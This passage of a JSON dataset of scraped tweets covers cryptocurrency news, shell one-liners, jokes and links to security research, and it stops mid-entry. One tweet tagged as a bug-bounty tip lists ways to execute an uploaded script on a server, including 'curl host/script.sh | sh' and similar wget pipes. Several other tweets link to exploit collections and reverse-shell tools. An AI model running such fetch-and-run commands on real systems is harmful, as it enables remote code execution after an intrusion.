+            "text": "Prepare your blockchain project for Polkadot! Use this guide to dive deep into how developers can build for the Polkadot platform today -https://medium.com/@polkadotnetwork/preparing-to-build-on-polkadot-349ff5002885\u00a0\u2026",
+            "username": "polkadotnetwork",
+            "num_likes": 89,
+            "num_retweets": 44,
+            "num_replies": 0
+        },
+        "1009891310000640000": {
+            "id": "1009891310000640000",
+            "text": "don\u2019t forget. today is #NationalSelfieDay. make sure you submit an updated high resolution image of your face to all your social media platforms. this is totes not a scheme by @nsa to make sure that the facial recognition databases are kept current with updated reference materialpic.twitter.com/F5PeLEyISf",
+            "username": "da5ch0",
+            "num_likes": 59,
+            "num_retweets": 20,
+            "num_replies": 5
+        },
+        "1009401562089783296": {
+            "id": "1009401562089783296",
+            "text": "Bitcoin is an adversarial network; by my count there were 68 attempts in the past week to feed an invalid block to my node. There was also an attempt to create 234,512 BTC out of thin air. This is why we don't trust, we verify.pic.twitter.com/B0h6y7EUH2",
+            "username": "lopp",
+            "num_likes": 4407,
+            "num_retweets": 1467,
+            "num_replies": 106
+        },
+        "1009110600687837184": {
+            "id": "1009110600687837184",
+            "text": "We\u2019re starting testing of our ad model. When the Brave ad system becomes widely available, users will receive 70% of the gross ad revenue, while preserving their privacy (ads shown in the browser in a private channel to users who consent to see them).https://brave.com/brave-launches-user-trials-for-opt-in-ads/\u00a0\u2026",
+            "username": "brave",
+            "num_likes": 557,
+            "num_retweets": 192,
+            "num_replies": 15
+        },
+        "1007206230232915970": {
+            "id": "1007206230232915970",
+            "text": "Microsoft Red Team and Pentesting\n\nhttps://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Gerald-Steere-and-Sean-Metcalf-Hacking-the-Cloud.pdf\u00a0\u2026\n\ncollection of open source and commercial tools that aid in red team operations\n\nhttps://github.com/infosecn1nja/Red-Teaming-Toolkit\u00a0\u2026\nhttps://adsecurity.org/wp-content/uploads/2017/07/2017-DEFCON-HackingTheCloud-SteereMetcalf-Final.pdf\u00a0\u2026\nhttps://www.wired.com/story/microsoft-windows-red-team/\u00a0\u2026\nhttps://download.microsoft.com/download/C/1/9/C1990DBA-502F-4C2A-848D-392B93D9B9C3/Microsoft_Enterprise_Cloud_Red_Teaming.pdf\u00a0\u2026pic.twitter.com/2anpx9OXHg",
+            "username": "cackerman1",
+            "num_likes": 686,
+            "num_retweets": 364,
+            "num_replies": 3
+        },
+        "1008019209064996864": {
+            "id": "1008019209064996864",
+            "text": "#Protip can u upload any file on server but can't u use chmod? try magic execution methods: \n\n\". ./script.sh\" (dot space ./script.sh)\n\"bash < http://script.sh\u00a0 \"\n\"cat http://script.sh\u00a0  | sh \"\n\"curl host/script.sh| sh \"\n\"wget host/script.sh| sh \"\n\n#BugBounty #infosecpic.twitter.com/oO5UdbzOz1",
+            "username": "omespino",
+            "num_likes": 446,
+            "num_retweets": 212,
+            "num_replies": 12
+        },
+        "1008267993380544513": {
+            "id": "1008267993380544513",
+            "text": "A collection of fully annotated iOS and Android exploitshttps://github.com/externalist/exploit_playground\u00a0\u2026",
+            "username": "Dinosn",
+            "num_likes": 526,
+            "num_retweets": 276,
+            "num_replies": 3
+        },
+        "1007983913925599232": {
+            "id": "1007983913925599232",
+            "text": "Ever wonder about the origin of transparency in the terminal? It started with this screenshot in early 1997. Someone made a fake by lining up a blurred clip of the background and making it rxvt term background. It influenced many others. Anyone have more details? Who is Rawg?pic.twitter.com/UyhGaMjQRh",
+            "username": "climagic",
+            "num_likes": 199,
+            "num_retweets": 54,
+            "num_replies": 9
+        },
+        "1005673217229541376": {
+            "id": "1005673217229541376",
+            "text": "ipsn / go-adorable: Adorable Avatars from Go https://github.com/ipsn/go-adorable\u00a0\u2026 #golang",
+            "username": "TrendingGolang",
+            "num_likes": 6,
+            "num_retweets": 2,
+            "num_replies": 0
+        },
+        "1006783181398343680": {
+            "id": "1006783181398343680",
+            "text": "List of bug bounty writeups  https://pentester.land/list-of-bug-bounty-writeups.html\u00a0\u2026pic.twitter.com/EvpqmgPX5c",
+            "username": "Alra3ees",
+            "num_likes": 227,
+            "num_retweets": 126,
+            "num_replies": 1
+        },
+        "1006555767443546114": {
+            "id": "1006555767443546114",
+            "text": "Geth v1.8.11 (Streamline) just released! 28% slower disk growth, 23% faster block processing, a lot stabler memory patterns! Take it for a spin :) https://github.com/ethereum/go-ethereum/releases/tag/v1.8.11\u00a0\u2026 #golang #Ethereum",
+            "username": "peter_szilagyi",
+            "num_likes": 95,
+            "num_retweets": 38,
+            "num_replies": 1
+        },
+        "1006801006980628480": {
+            "id": "1006801006980628480",
+            "text": "Extracting the Private Key from a TREZOR with a $70 Oscilloscope https://jochen-hoenicke.de/trezor-power-analysis/\u00a0\u2026 #bitcoinpic.twitter.com/XPGfDhkbKG",
+            "username": "x0rz",
+            "num_likes": 540,
+            "num_retweets": 235,
+            "num_replies": 9
+        },
+        "1006218412069150720": {
+            "id": "1006218412069150720",
+            "text": "Encryption is a critical component of the #Web3 tech stack. @_lunar_mining lays out the projects providing encryption solutions on top of blockchain protocols, including @ParityTech's secret store and @EnigmaMPC's secret contracts. -  https://www.coindesk.com/four-projects-seek-solve-ethereums-privacy-paradox/\u00a0\u2026pic.twitter.com/le2n1FSGBb",
+            "username": "web3foundation",
+            "num_likes": 186,
+            "num_retweets": 76,
+            "num_replies": 5
+        },
+        "1005103669233311744": {
+            "id": "1005103669233311744",
+            "text": "yes \"$(seq 231 -1 16)\" | while read i; do printf \"\\x1b[48;5;${i}m\\n\"; sleep .02; done # A \"rainbow\" in your shell. Happy 29th Birthday Bash! #bash #cli #unix #linuxpic.twitter.com/u9nCvzG31J",
+            "username": "climagic",
+            "num_likes": 781,
+            "num_retweets": 346,
+            "num_replies": 7
+        },
+        "1001872131997814785": {
+            "id": "1001872131997814785",
+            "text": "xclip -out -selection clipboard | qrencode -o - -t UTF8 # Display clipboard content as a QR-code using Unicode characters. Thanks @JenrikForLifepic.twitter.com/IT4EPtHMpT",
+            "username": "climagic",
+            "num_likes": 869,
+            "num_retweets": 302,
+            "num_replies": 18
+        },
+        "1001882642449616896": {
+            "id": "1001882642449616896",
+            "text": "ethereumJS client development has officially started! Learn how you can contribute: https://goo.gl/5AwbkR\u00a0 #ethereum #ethereumJS",
+            "username": "ethereum",
+            "num_likes": 474,
+            "num_retweets": 227,
+            "num_replies": 64
+        },
+        "1001427208177565696": {
+            "id": "1001427208177565696",
+            "text": "Really appreciate all the work AMIS http://am.is\u00a0 is putting into help make Casper work!https://medium.com/getamis/implementing-casper-ffg-in-geth-mitigating-spam-votes-with-null-sender-ccb32efe3983\u00a0\u2026",
+            "username": "VitalikButerin",
+            "num_likes": 428,
+            "num_retweets": 146,
+            "num_replies": 54
+        },
+        "1001071112615350272": {
+            "id": "1001071112615350272",
+            "text": "We are beginning pre-registration for our #CorrectbyConstruction Casper crash course: http://bit.ly/benCASPERcourse\u00a0\n@VladZamfir will be teaching the course through a series of video lectures & online office hours along w/ a team of #Casper researchers, TBD.\n\n#Sharding #CBC #Consensuspic.twitter.com/1BmDllchRA",
+            "username": "BlockchainEDU",
+            "num_likes": 32,
+            "num_retweets": 11,
+            "num_replies": 3
+        },
+        "1001446835557470208": {
+            "id": "1001446835557470208",
+            "text": "Cloudflare DNS's @1111resolver has been BGP-hijacked this morning by AS58879 https://twitter.com/bgpstream/status/1001420445890043904\u00a0\u2026",
+            "username": "x0rz",
+            "num_likes": 691,
+            "num_retweets": 726,
+            "num_replies": 13
+        },
+        "1001504623922958337": {
+            "id": "1001504623922958337",
+            "text": "Our public UI is live and looking good - however, we\u2019re just getting started so if you have feedback head over to the @RiotChat - for the testers: you know what to do, ask us for test DOTs and experience POC-1https://twitter.com/polkadotnetwork/status/1001500590684409856\u00a0\u2026",
+            "username": "gavofyork",
+            "num_likes": 32,
+            "num_retweets": 8,
+            "num_replies": 1
+        },
+        "1001068502000730112": {
+            "id": "1001068502000730112",
+            "text": "Geth v1.8.9 (Sacrosanct) just out! Fixes the txpool memory issues that have been occurring lately and reduces idle CPU load after sync is done! #golang #Ethereumhttps://github.com/ethereum/go-ethereum/releases/tag/v1.8.9\u00a0\u2026",
+            "username": "peter_szilagyi",
+            "num_likes": 88,
+            "num_retweets": 28,
+            "num_replies": 3
+        },
+        "999230726942920704": {
+            "id": "999230726942920704",
+            "text": "So many academics forget that our goal, as a profession, is *not* to publish papers. It's to change the world.",
+            "username": "el33th4xor",
+            "num_likes": 2274,
+            "num_retweets": 653,
+            "num_replies": 117
+        },
+        "999554344386224128": {
+            "id": "999554344386224128",
+            "text": "I reported a subdomain takeover vulnerability to @Sony more than 3 weeks ago. It's still not fixed. To increase their motivation I made it a bit more colorful. http://www.myhomemanager.sony.com/\u00a0",
+            "username": "hanno",
+            "num_likes": 515,
+            "num_retweets": 240,
+            "num_replies": 35
+        },
+        "999322709275365377": {
+            "id": "999322709275365377",
+            "text": "No turning back now - next release will be version 0.5.0, a breaking release: https://github.com/ethereum/solidity/pull/4067\u00a0\u2026 #Solidity #Ethereum",
+            "username": "ethchris",
+            "num_likes": 22,
+            "num_retweets": 3,
+            "num_replies": 1
+        },
+        "996731215662239744": {
+            "id": "996731215662239744",
+            "text": "Remix IDE 0.6.3 Released!https://medium.com/remix-ide/remix-new-release-dcd5673e6777\u00a0\u2026",
+            "username": "ethereum",
+            "num_likes": 446,
+            "num_retweets": 188,
+            "num_replies": 38
+        },
+        "996313234763214849": {
+            "id": "996313234763214849",
+            "text": "Samurai Email Discovery - SED is a email discovery framework that grabs emails via google dork, company name, or domain name. \n\nhttps://github.com/0x3curity/Samurai\u00a0\u2026pic.twitter.com/0hNOgjNu2f",
+            "username": "campuscodi",
+            "num_likes": 42,
+            "num_retweets": 24,
+            "num_replies": 3
+        },
+        "996390579327111169": {
+            "id": "996390579327111169",
+            "text": "Parity 1.11 Beta has arrived. Now you can create encrypted contracts and transactions on-chain.\nhttps://paritytech.io/parity_1_11_beta_private_transactions/\u00a0\u2026pic.twitter.com/ZIirbOVeMX",
+            "username": "ParityTech",
+            "num_likes": 78,
+            "num_retweets": 34,
+            "num_replies": 6
+        },
+        "995984751747092480": {
+            "id": "995984751747092480",
+            "text": "Geth v1.8.8 (Coffice) just released! And we have a team pic to go with it :D https://github.com/ethereum/go-ethereum/releases/tag/v1.8.8\u00a0\u2026 #golang #Ethereumpic.twitter.com/OzjPLhRYIN",
+            "username": "peter_szilagyi",
+            "num_likes": 345,
+            "num_retweets": 65,
+            "num_replies": 26
+        },
+        "995303078722129921": {
+            "id": "995303078722129921",
+            "text": "RCE in Electron, the engine at the core of Slack, Discord, Signal, Atom, Visual Studio Code, and Github Desktop \n\nhttps://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-1000136---Electron-nodeIntegration-Bypass/\u00a0\u2026pic.twitter.com/eOHNuhK0Vd",
+            "username": "campuscodi",
+            "num_likes": 341,
+            "num_retweets": 282,
+            "num_replies": 7
+        },
+        "993244875729620992": {
+            "id": "993244875729620992",
+            "text": "Nice tool - ShellPop - Bind and Reverse Shells generator for #Python, #PHP, #Ruby, #netcat, #sockat and #PowerShell\n\nby http://github.com/zc00l\u00a0, http://github.com/touhidshaikh\u00a0 and http://github.com/lowfuel\u00a0\n#hacking #PenTest #itsecurity #infosecurity #redteam #CTF\nhttps://github.com/0x00-0x00/ShellPop\u00a0\u2026pic.twitter.com/O4MjvH4g5e",
+            "username": "_bl4de",
+            "num_likes": 205,
+            "num_retweets": 115,
+            "num_replies": 1
+        },
+        "991646247185461251": {
+            "id": "991646247185461251",
+            "text": "Geth v1.8.7 (Titanium) just out! Fixes the 1TiB archive node leveldb crash + some minor other issues. Shout-out to @tstranex for finding and fixing the crash for us! #Ethereumhttps://github.com/ethereum/go-ethereum/releases/tag/v1.8.7\u00a0\u2026",
+            "username": "peter_szilagyi",
+            "num_likes": 45,
+            "num_retweets": 12,
+            "num_replies": 1
+        },
+        "991096619398586369": {
+            "id": "991096619398586369",
+            "text": "I've said a lot about how miner and coin holder interests aren't aligned with user interests, but I've mostly neglected devs (my mistake). So:\n\nSoftware development interests are not aligned with user interests",
+            "username": "VladZamfir",
+            "num_likes": 109,
+            "num_retweets": 21,
+            "num_replies": 16
+        },
+        "990640075225546752": {
+            "id": "990640075225546752",
+            "text": "Javascript reaches peak sheepishness.pic.twitter.com/9K0dloh0Up",
+            "username": "VitalikButerin",
+            "num_likes": 1163,
+            "num_retweets": 228,
+            "num_replies": 64
+        },
+        "989484137894555651": {
+            "id": "989484137894555651",
+            "text": "I thought deeply about #EIP867, #EIP999, funds recovery and governance in general. We need to do a better job of documenting and explaining #Ethereum governance. As a first step, I just published \"To Fork or Not to Fork.\"https://medium.com/crypto-nyc/to-fork-or-not-to-fork-fbc8f9010cc1\u00a0\u2026",
+            "username": "lrettig",
+            "num_likes": 109,
+            "num_retweets": 38,
+            "num_replies": 7
+        },
+        "989430787278819328": {
+            "id": "989430787278819328",
+            "text": "We have heard the community and continue to do so. Please read our statement on the current series of events we are involved.https://paritytech.io/our-commitment-to-ethereum-and-a-decentralised-future/\u00a0\u2026",
+            "username": "gavofyork",
+            "num_likes": 377,
+            "num_retweets": 131,
+            "num_replies": 10
+        },
+        "989175710030823424": {
+            "id": "989175710030823424",
+            "text": "Meteorologist https://xkcd.com/1985/\u00a0 https://m.xkcd.com/1985/\u00a0pic.twitter.com/hC3zCk1cgs",
+            "username": "xkcdComic",
+            "num_likes": 3170,
+            "num_retweets": 1283,
+            "num_replies": 35
+        },
+        "986826974097297408": {
+            "id": "986826974097297408",
+            "text": "\u201cWhatsapp user\u2019s IP disclosure with Link Preview feature\u201d by rahul kankralehttps://medium.com/@kankrale.rahul/whatsapp-users-ip-disclosure-with-link-preview-feature-39a477f54fba?source=twitterShare-1764222123d3-1524112858\u00a0\u2026",
+            "username": "Alra3ees",
+            "num_likes": 14,
+            "num_retweets": 6,
+            "num_replies": 0
+        },
+        "986638592020709383": {
+            "id": "986638592020709383",
+            "text": "Rogue way to upgrade #solidity in truffle:\nwget https://solc-bin.ethereum.org/soljson.js\u00a0 -O /tmp/soljson.js && find . -name soljson.js -exec cp /tmp/soljson.js {} \\;",
+            "username": "ethchris",
+            "num_likes": 17,
+            "num_retweets": 6,
+            "num_replies": 3
+        },
+        "986047411557548032": {
+            "id": "986047411557548032",
+            "text": "So after a live demo where I abused printer help on their thin client OS to gain root access at @BSidesCbr I get this ad on linkedin... pic.twitter.com/2zb0WfNr3u",
+            "username": "wireghoul",
+            "num_likes": 23,
+            "num_retweets": 3,
+            "num_replies": 2
+        },
+        "982299621987889152": {
+            "id": "982299621987889152",
+            "text": "Can't be any much longer until revert with reason is merged! We changed the data encoding to go in direction of EIP 838 by @federicobond - https://github.com/ethereum/solidity/pull/3364/files#diff-093c7b9d55386ce8842208ea6e7e9ee2R523\u00a0\u2026 #solidity #ethereum",
+            "username": "ethchris",
+            "num_likes": 11,
+            "num_retweets": 5,
+            "num_replies": 2
+        },
+        "980991169160208384": {
+            "id": "980991169160208384",
+            "text": "The security researcher who originally reported the @panerabread security vuln that exposed millions of customers' private info has just penned this response to the company's unbelievable response to my story. worth a read:https://medium.com/@djhoulihan/no-panera-bread-doesnt-take-security-seriously-bf078027f815\u00a0\u2026",
+            "username": "briankrebs",
+            "num_likes": 1707,
+            "num_retweets": 1321,
+            "num_replies": 44
+        },
+        "979330302085615616": {
+            "id": "979330302085615616",
+            "text": "CVE-2018-7600: Drupal Remote Code Execution https://www.drupal.org/sa-core-2018-002\u00a0\u2026pic.twitter.com/YJjmfEXPcx",
+            "username": "x0rz",
+            "num_likes": 363,
+            "num_retweets": 205,
+            "num_replies": 12
+        },
+        "978699262300246018": {
+            "id": "978699262300246018",
+            "text": "I just published go-deliver. A payload delivery tool written in Go.\nCheck it out :https://github.com/0x09AL/go-deliver\u00a0\u2026",
+            "username": "0x09AL",
+            "num_likes": 136,
+            "num_retweets": 68,
+            "num_replies": 2
+        },
+        "976910312422047744": {
+            "id": "976910312422047744",
+            "text": "True story: there is no secret silver bullet that will make you \u201cgood\u201c at security\u2014 being good at anything requires work (not innate talent), and commitment to continuous education. \n\nHaving smart friends who write good books that help refresh my  doesn\u2019t hurt though  pic.twitter.com/4m2jwmT1xZ",
+            "username": "jessysaurusrex",
+            "num_likes": 908,
+            "num_retweets": 149,
+            "num_replies": 32
+        },
+        "972954565971603456": {
+            "id": "972954565971603456",
+            "text": "This is looks a major breakthrough in practical fully homomorphic encryption.\nhttps://eprint.iacr.org/2018/245.pdf\u00a0pic.twitter.com/XqOYDrBn2a",
+            "username": "zmanian",
+            "num_likes": 288,
+            "num_retweets": 119,
+            "num_replies": 5
+        },
+        "971847364116959232": {
+            "id": "971847364116959232",
+            "text": "Gas arbitrage! This project demonstrates a brilliant understanding of the inner workings of Ethereum.https://twitter.com/phildaian/status/971781982849064960\u00a0\u2026",
+            "username": "cryptic_monk",
+            "num_likes": 14,
+            "num_retweets": 5,
+            "num_replies": 3
+        },
+        "971690172629831680": {
+            "id": "971690172629831680",
+            "text": "Subdomain Enumeration in Go https://github.com/caffix/amass\u00a0 #pentest #redteam",
+            "username": "x0rz",
+            "num_likes": 67,
+            "num_retweets": 33,
+            "num_replies": 0
+        },
+        "971693234094268416": {
+            "id": "971693234094268416",
+            "text": "Presented @rotkehlchenio this morning in #Paris #EthCC. For more information check github: https://github.com/rotkehlchenio/rotkehlchen\u00a0\u2026 and the website http://rotkehlchen.io/\u00a0https://twitter.com/bezzenberger/status/971672502496882694\u00a0\u2026",
+            "username": "LefterisJP",
+            "num_likes": 26,
+            "num_retweets": 9,
+            "num_replies": 1
+        },
+        "971676586742288384": {
+            "id": "971676586742288384",
+            "text": "#Solidity version 0.4.21 released, featuring (among others) staticcall and other opt-in breaking security changes!https://github.com/ethereum/solidity/releases/tag/v0.4.21\u00a0\u2026",
+            "username": "ethchris",
+            "num_likes": 143,
+            "num_retweets": 55,
+            "num_replies": 2
+        },
+        "969712733242437632": {
+            "id": "969712733242437632",
+            "text": "Our latest cover story is up! \"There Is a Bitcoin Patent War Going On, but This Initiative Could End It\" https://bitcoinmagazine.com/articles/there-bitcoin-patent-war-going-initiative-could-end-it/\u00a0\u2026 #blockchain #bitcoin #bitmain #BDPL #DPL #patents",
+            "username": "BitcoinMagazine",
+            "num_likes": 404,
+            "num_retweets": 254,
+            "num_replies": 136
+        },
+        "971045338873200647": {
+            "id": "971045338873200647",
+            "text": "How Marcus Hutchins (aka @MalwareTechBlog) went from hero to alleged criminal. Good profile by @reeveswiedeman.http://nymag.com/selectall/2018/03/marcus-hutchins-hacker.html\u00a0\u2026",
+            "username": "lorenzofb",
+            "num_likes": 129,
+            "num_retweets": 63,
+            "num_replies": 3
+        },
+        "971085983998496768": {
+            "id": "971085983998496768",
+            "text": "#Ethereum has become a household name, but what's actually happening on the blockchain is still a mystery for many. @AlethioEthstats is out to change all that.https://media.consensys.net/alethio-lighting-up-the-blockchain-with-real-time-stats-a80bb30576db\u00a0\u2026",
+            "username": "ConsenSys",
+            "num_likes": 172,
+            "num_retweets": 83,
+            "num_replies": 3
+        },
+        "970464045739528194": {
+            "id": "970464045739528194",
+            "text": "4G LTE pried open to reveal a slew of new protocol-level attacks http://reg.cx/2DJs\u00a0",
+            "username": "ElReg",
+            "num_likes": 3,
+            "num_retweets": 3,
+            "num_replies": 0
+        },
+        "970245720560123904": {
+            "id": "970245720560123904",
+            "text": "No, I'm not giving away ETH.",
+            "username": "VitalikButerin",
+            "num_likes": 6807,
+            "num_retweets": 1073,
+            "num_replies": 464
+        },
+        "967256834666004480": {
+            "id": "967256834666004480",
+            "text": "The #LightningNetwork on testnet is absolutely massive! Developers from all over the world are testing it, running nodes, adding channels and sending payments to one another. Keep up the good work! #bitcoin #segwit #BitcoinIsScaling \n\nNodes: 2,843\nChannels: 15,612pic.twitter.com/fMwoLE7bfc",
+            "username": "ArminVanBitcoin",
+            "num_likes": 2953,
+            "num_retweets": 1382,
+            "num_replies": 142
+        },
+        "967171731424124928": {
+            "id": "967171731424124928",
+            "text": "it's been amazing to watch @brave take off with YouTube creators who are trying to make money without depending on ads. more platforms coming soon!https://twitter.com/dailydot/status/967126923485859840\u00a0\u2026",
+            "username": "bcrypt",
+            "num_likes": 160,
+            "num_retweets": 31,
+            "num_replies": 9
+        },
+        "964574624020385798": {
+            "id": "964574624020385798",
+            "text": "A fucking huge mine for pentesters. It also will help you for the OSCP and OSCE ! Thanks for the owner of this \n#OSCP #OSCE #Pentestinghttps://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/\u00a0\u2026",
+            "username": "DRX_Sicher",
+            "num_likes": 1193,
+            "num_retweets": 570,
+            "num_replies": 7
+        },
+        "965715865504239616": {
+            "id": "965715865504239616",
+            "text": "Steven Seagal has just ended 2018. I\u2019m done. I can\u2019t even.  https://twitter.com/sseagalofficial/status/965635047230406657\u00a0\u2026",
+            "username": "GossiTheDog",
+            "num_likes": 82,
+            "num_retweets": 30,
+            "num_replies": 7
+        },
+        "964159702107148288": {
+            "id": "964159702107148288",
+            "text": "Only now getting up to speed on the  suggestion of creating a formal ERP (Ethereum Recovery Proposal) procedure for recovering ETH lost to mistakes, bugs etc. IMO going down this path would be very dangerous. Yoichi resigned as an EIP editor because of the legal uncertainty.https://twitter.com/pirapira/status/963950687288733697\u00a0\u2026",
+            "username": "ChrisLundkvist",
+            "num_likes": 45,
+            "num_retweets": 11,
+            "num_replies": 3
+        },
+        "963568062548000768": {
+            "id": "963568062548000768",
+            "text": "Hi, I created JavaScript. You should block JS used for 3rd party trackers, fingerprinting, ads. You should definitely block the new cryptocurrency mining scripts.\n\n@Brave is one solution; we aim for always-on, tested ease of use. Other solutions exist, require more work of users.",
+            "username": "BrendanEich",
+            "num_likes": 6941,
+            "num_retweets": 3206,
+            "num_replies": 113
+        },
+        "963784518623793152": {
+            "id": "963784518623793152",
+            "text": "Roses are red,\nViolets are blue,\nif err != nil\nreturn true\n\n#golang",
+            "username": "jeeger",
+            "num_likes": 13,
+            "num_retweets": 9,
+            "num_replies": 1
+        },
+        "963775586446577664": {
+            "id": "963775586446577664",
+            "text": "Good reminder: VPN and threat modeling https://gist.github.com/joepie91/5a9909939e6ce7d09e29\u00a0\u2026 #VPN #threatmodel #privacy",
+            "username": "x0rz",
+            "num_likes": 189,
+            "num_retweets": 92,
+            "num_replies": 12
+        },
+        "963785260554010624": {
+            "id": "963785260554010624",
+            "text": "Roses aren\u2019t red,\nViolets aren\u2019t blue.\nThey\u2019re just a simulation, \nAnd so are you.",
+            "username": "BoredElonMusk",
+            "num_likes": 9451,
+            "num_retweets": 2578,
+            "num_replies": 189
+        },
+        "963518668846985216": {
+            "id": "963518668846985216",
+            "text": "Roses are red\nViolets are blue\nI know how to fix this\nA bash loop: while true\n#sysadminvalentine",
+            "username": "jdub",
+            "num_likes": 17,
+            "num_retweets": 10,
+            "num_replies": 2
+        },
+        "963411948766482432": {
+            "id": "963411948766482432",
+            "text": "Detecting responder & compromised machines in your network  https://github.com/codeexpress/respounder\u00a0\u2026 #blueteam #DFIR #pentest #ThreatHuntingpic.twitter.com/GTiM9VwJnq",
+            "username": "x0rz",
+            "num_likes": 404,
+            "num_retweets": 180,
+            "num_replies": 5
+        },
+        "963464027824443393": {
+            "id": "963464027824443393",
+            "text": "Interesting: a honeypot smart contract that looks exploitable, but then eats up the ether deposited by the would-be hackers.https://www.reddit.com/r/ethdev/comments/7x5rwr/tricked_by_a_honeypot_contract_or_beaten_by/\u00a0\u2026",
+            "username": "el33th4xor",
+            "num_likes": 281,
+            "num_retweets": 102,
+            "num_replies": 4
+        },
+        "963431566016958464": {
+            "id": "963431566016958464",
+            "text": "rsync -av --progress Music user@remote: # Don't just sit there wondering about the status of your data transfer, use --progress",
+            "username": "climagic",
+            "num_likes": 132,
+            "num_retweets": 44,
+            "num_replies": 3
+        },
+        "963097993237889024": {
+            "id": "963097993237889024",
+            "text": "We've released cpu_features, a small, fast, & simple open source library for determining CPU features at runtime. It can be used to tune code when speed is paramount, such as in a video codec or library for processing tensors\n\nLearn more from our blog \u2193http://goo.gl/ZqGoiF\u00a0",
+            "username": "googledevs",
+            "num_likes": 171,
+            "num_retweets": 69,
+            "num_replies": 1
+        },
+        "960608002330984450": {
+            "id": "960608002330984450",
+            "text": "TIL that Github will detect any valid Github OAuth token pushed to public repo; alert the owner and revoke the token. \n\nSo embedding a token with null permissions (from an unused account) in a private/confidential repo is a way of getting notified if anyone makes the code public.",
+            "username": "RomanYurchak",
+            "num_likes": 1419,
+            "num_retweets": 498,
+            "num_replies": 11
+        },
+        "962740918053888000": {
+            "id": "962740918053888000",
+            "text": "BitGrail lost $170 million worth of Nano XRB tokens because... the checks for whether you had a sufficient balance to withdraw were only implemented as client-side JavaScript https://www.reddit.com/r/CryptoCurrency/comments/7wonkf/the_stolen_xrb_has_already_been_redistributedsold/du215tr/\u00a0\u2026pic.twitter.com/WmCwj5gy8W",
+            "username": "bascule",
+            "num_likes": 4850,
+            "num_retweets": 2802,
+            "num_replies": 203
+        },
+        "961983288750391296": {
+            "id": "961983288750391296",
+            "text": "Dear social media apps:\nPLEASE STOP MESSING WITH CHRONOLOGICAL ORDER. We live our lives chronologically, so when it jumps all over the place, it's really frustrating.\nI get it, you want to make money. We all do. Find another way other to do it.\nSincerely,\nEvery person online ever",
+            "username": "RachhLoves",
+            "num_likes": 155451,
+            "num_retweets": 42133,
+            "num_replies": 372
+        },
+        "962569082045452288": {
+            "id": "962569082045452288",
+            "text": "Ethereum really set a bad example for new people in crypto getting involved with different coin projects. \n\nNow every time there is a hack they reach for the @VitalikButerin option and demand hard fork to bailout.\n\nCongratulations, seriously.pic.twitter.com/rggjxPxU3m",
+            "username": "whalepool",
+            "num_likes": 305,
+            "num_retweets": 65,
+            "num_replies": 27
+        },
+        "962101784922742784": {
+            "id": "962101784922742784",
+            "text": "Compress a directory and transfer the .tar.gz to another host securely over SSH without creating a temp file or taking up any disk space on the client machine (useful for when you have zero free space on the client)\n\n$ tar xzcf - whatever/ | ssh user@host 'cat > whatever.tar.gz'",
+            "username": "Andrew___Morris",
+            "num_likes": 307,
+            "num_retweets": 78,
+            "num_replies": 10
+        },
+        "962021992181436416": {
+            "id": "962021992181436416",
+            "text": "Installer plugins enable an attacker to load their (unsigned) code into a native (signed) macOS application. This is now my favorite payload for initial access on macOS. https://posts.specterops.io/malicious-installer-plugins-6e30991bb529\u00a0\u2026",
+            "username": "xorrior",
+            "num_likes": 436,
+            "num_retweets": 288,
+            "num_replies": 5
+        },
+        "961054613125308416": {
+            "id": "961054613125308416",
+            "text": "Crystals as transactions and the Merkle tree underneath thempic.twitter.com/KsV1HQDiFC",
+            "username": "IOHK_Charles",
+            "num_likes": 473,
+            "num_retweets": 89,
+            "num_replies": 25
+        },
+        "960824077647835137": {
+            "id": "960824077647835137",
+            "text": "Here are the ICOs for which I have requested Trust Reviews. Scammers are everywhere in the Crypto arena and ensuring the validity of projects is paramount. I place top priority on these reviews:https://cryptocoinconnection.com/ICOaudits/\u00a0",
+            "username": "officialmcafee",
+            "num_likes": 771,
+            "num_retweets": 239,
+            "num_replies": 274
+        },
+        "959770508869980160": {
+            "id": "959770508869980160",
+            "text": "It was invented by Satoshi Nakamoto, a developer at Nintendo who mysteriously disappeared in the 1990s. The multiplayer mode in Goldeneye N64, on which he was lead developer, uses a primitive form of Bitcoin to keep track of high scores.",
+            "username": "BryceElder",
+            "num_likes": 1362,
+            "num_retweets": 284,
+            "num_replies": 22
+        },
+        "959827106384490496": {
+            "id": "959827106384490496",
+            "text": "Roses are red\nViolets are blue\nUnexpected '{' on line 32",
+            "username": "kvlly",
+            "num_likes": 33382,
+            "num_retweets": 11387,
+            "num_replies": 171
+        },
+        "959138611617673216": {
+            "id": "959138611617673216",
+            "text": "In the battle of crypto != cryptocurrency, we have no leverage. I say we steal \"blockchain\" and use it to describe block cipher modes. \"AES can be used in a variety of blockchain modes, such as CBC, ECB, or OTR.\" We then offer a hostage exchange.",
+            "username": "paul_pearce",
+            "num_likes": 1770,
+            "num_retweets": 671,
+            "num_replies": 45
+        },
+        "958730224732180480": {
+            "id": "958730224732180480",
+            "text": "Did you know: when doing M-of-N shamir secret sharing with keys of size k, you can actually share a secret of size kM? How cool is that!",
+            "username": "socrates1024",
+            "num_likes": 21,
+            "num_retweets": 7,
+            "num_replies": 2
+        },
+        "957383566266064901": {
+            "id": "957383566266064901",
+            "text": "The more widely distributed cryptocurrencies are, the greater the chance they survive a showdown with governments. Look to the upcoming wave of \u201cfaircoins.\u201d",
+            "username": "naval",
+            "num_likes": 1323,
+            "num_retweets": 305,
+            "num_replies": 57
+        },
+        "958349953683853312": {
+            "id": "958349953683853312",
+            "text": "It's possible to first preimage attack dahua hashes. They are used in many CCTV camera systems. Proof in screenshot.pic.twitter.com/u70nVmOrsy",
+            "username": "hashcat",
+            "num_likes": 62,
+            "num_retweets": 35,
+            "num_replies": 2
+        },
+        "958137042503794688": {
+            "id": "958137042503794688",
+            "text": "Wow, the official Ethereum wallet (https://github.com/ethereum/mist/releases/tag/v0.9.3\u00a0\u2026) is still on Chromium 58.",
+            "username": "bcrypt",
+            "num_likes": 76,
+            "num_retweets": 19,
+            "num_replies": 12
+        },
+        "949902315707809792": {
+            "id": "949902315707809792",
+            "text": "PSA: If you are NOT running your ETH node on a high end server and it falls behind, you will probably not be able to catch up.  The node count will definitely be dropping soon.",
+            "username": "JamesCPoole",
+            "num_likes": 146,
+            "num_retweets": 60,
+            "num_replies": 13
+        },
+        "951118704116486145": {
+            "id": "951118704116486145",
+            "text": "What came to my mind when I read the Kodak blockchain announcementpic.twitter.com/iIaRcdXX4M",
+            "username": "technollama",
+            "num_likes": 38,
